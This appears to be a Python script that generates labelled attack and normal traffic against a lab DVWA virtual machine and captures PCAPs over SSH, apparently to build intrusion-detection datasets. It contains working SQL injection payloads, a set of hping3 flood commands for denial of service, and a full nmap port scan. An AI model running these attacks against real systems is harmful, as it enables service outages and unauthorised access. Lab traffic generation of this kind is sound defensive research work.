#!/usr/bin/env python3

import subprocess
import random
import time
import requests
from functools import wraps
from enum import Enum

# Config
DEFAULT_TARGET = "192.168.122.224"
DEFAULT_INTERFACE = "enp1s0"
TARGET_CONFIG = {
    "login_path": "/login.php",      # DVWA default
    "api_path": "/api/data",
    "web_port": 80
}

# Enum for attack types
class AttackType(Enum):
    NORMAL = "normal"
    SQL_INJECTION = "sql_injection"
    DDOS = "ddos"
    PORT_SCAN = "port_scan"

# --- Core Functions ---
def run_remote_cmd(vm_ip: str, cmd: str) -> bool:
    """Run a command on the target VM (via SSH)."""
    try:
        subprocess.run(["ssh", f"root@{vm_ip}", cmd], check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Remote command failed: {e}")
        return False

def make_pcap_dir(vm_ip: str, dir_name: str)->bool:
    return run_remote_cmd(
        vm_ip,
        f"mkdir /tmp/{dir_name}"
    )

def start_pcap_capture(vm_ip: str, pcap_name: str) -> bool:
    """Start tcpdump on the target VM."""
    return run_remote_cmd(
        vm_ip,
        f"nohup /usr/bin/tcpdump -i {DEFAULT_INTERFACE} -w /tmp/{pcap_name}.pcap > /tmp/tcpdump.log 2>&1 &"
    )

def stop_pcap_capture(vm_ip: str, pcap_name: str) -> bool:
    run_remote_cmd(vm_ip, "pkill tcpdump")
    subprocess.run(["mkdir", "-p", "./pcaps/"], check=True)
    result = subprocess.run(
        ["scp", f"root@{vm_ip}:/tmp/{pcap_name}.pcap", "./pcaps/"],
        check=False
    )
    if result.returncode != 0:
        print("Failed to fetch PCAP via SCP.")
    return result.returncode == 0

# --- Traffic Generators ---
def normal_traffic(target_ip: str, duration: int = 600):
    """Simulate realistic user traffic with sessions and headers."""
    base_url = f"http://{target_ip}"
    session = requests.Session()

    # Random-ish user-agent headers
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ])
    }

    endpoints = [
        TARGET_CONFIG["api_path"],
        "/index.php",
        "/vulnerabilities/sqli/",
        "/vulnerabilities/brute/",
        "/about.php",
        "/setup.php",
        "/security.php",
        "/logout.php",
    ]

    print("==BEGIN NORMAL_TRAFFIC==")
    start_time = time.time()

    # Log in first — DVWA sets a cookie
    try:
        session.post(
            f"{base_url}{TARGET_CONFIG['login_path']}",
            data={"username": "guest", "password": "password123", "Login": "Login"},
            headers=headers
        )
    except Exception as e:
        print(f"Login failed: {e}")

    while time.time() - start_time < duration:
        endpoint = random.choice(endpoints)
        try:
            if "logout" in endpoint:
                session.get(f"{base_url}{endpoint}", headers=headers)
                time.sleep(1)
                session.post(
                    f"{base_url}{TARGET_CONFIG['login_path']}",
                    data={"username": "guest", "password": "password123", "Login": "Login"},
                    headers=headers
                )
            else:
                session.get(f"{base_url}{endpoint}", headers=headers)
            time.sleep(random.uniform(0.3, 1.5))
        except Exception as e:
            print(f"Request failed: {e}")
    print("==  END NORMAL_TRAFFIC==")

def sql_injection(target_ip: str):
    """Send SQLi payloads to the server."""
    payloads = [
        "admin' OR '1'='1'-- -",
        "' UNION SELECT 1,2,3-- -",
        "' AND 1=CONVERT(int, @@version)-- -"
    ]
    for payload in payloads:
        try:
            requests.post(
                f"http://{target_ip}{TARGET_CONFIG['login_path']}",
                data={"username": payload, "password": "x"}
            )
        except Exception as e:
            print(f"SQLi failed: {e}")

def ddos(target_ip: str, attack_type: str = "syn_flood", duration: int = 100):
    """Launch a DDoS attack using hping3 for a fixed duration."""
    attacks = {
        "syn_flood": f"hping3 -S -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
        "ack_flood": f"hping3 -A -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
        "udp_flood": f"hping3 --udp -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
        "icmp_flood": f"hping3 --icmp {target_ip} --flood",
        "rst_flood": f"hping3 -R -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
        "fin_flood": f"hping3 -F -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
        "xmas_flood": f"hping3 -F -S -U -p {TARGET_CONFIG['web_port']} {target_ip} --flood",
    }

    if attack_type not in attacks:
        print(f"Unknown DDoS type '{attack_type}', defaulting to SYN flood.")
        attack_type = "syn_flood"

    try:
        print(f"==BEGIN {attack_type.upper()} for {duration}s==")
        subprocess.run(
            f"timeout {duration} {attacks[attack_type]}",
            shell=True,
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"{attack_type} failed: {e}")
    print(f"==  END {attack_type.upper()}==")


# --- Main Workflow ---
def simulate_attack(attack_type: AttackType, target_ip: str):
    """Orchestrate PCAP capture + attack."""
    make_pcap_dir(target_ip, f"{attack_type.value}")
    pcap_name = f"{attack_type.value}_{int(time.time())}"

    # Start capture on the SERVER
    if not start_pcap_capture(target_ip, pcap_name):
        print("Failed to start PCAP capture.")
        return

    # Generate traffic
    if attack_type == AttackType.NORMAL:
        normal_traffic(target_ip)
    elif attack_type == AttackType.SQL_INJECTION:
        sql_injection(target_ip)
    elif attack_type == AttackType.DDOS:
        ddos(target_ip)
    elif attack_type == AttackType.PORT_SCAN:
        subprocess.run(["nmap", "-p-", target_ip])

    # Stop capture and fetch PCAP
    stop_pcap_capture(target_ip, pcap_name)
    print(f"PCAP saved: {pcap_name}.pcap")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "attack_type",
        choices=[at.value for at in AttackType],
        help="Type of traffic to generate"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help="Target server IP"
    )
    args = parser.parse_args()

    # Run
    simulate_attack(AttackType(args.attack_type), args.target)
